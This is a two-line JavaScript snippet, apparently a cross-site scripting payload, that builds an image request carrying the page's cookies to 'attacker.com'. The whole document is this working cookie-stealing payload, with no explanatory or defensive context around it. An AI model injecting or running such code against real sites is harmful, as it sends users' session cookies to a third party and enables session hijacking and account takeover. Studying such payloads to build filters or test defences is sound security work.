var img = new Image();
img.src = "http://attacker.com/steal?cookie=" + encodeURIComponent(document.cookie);
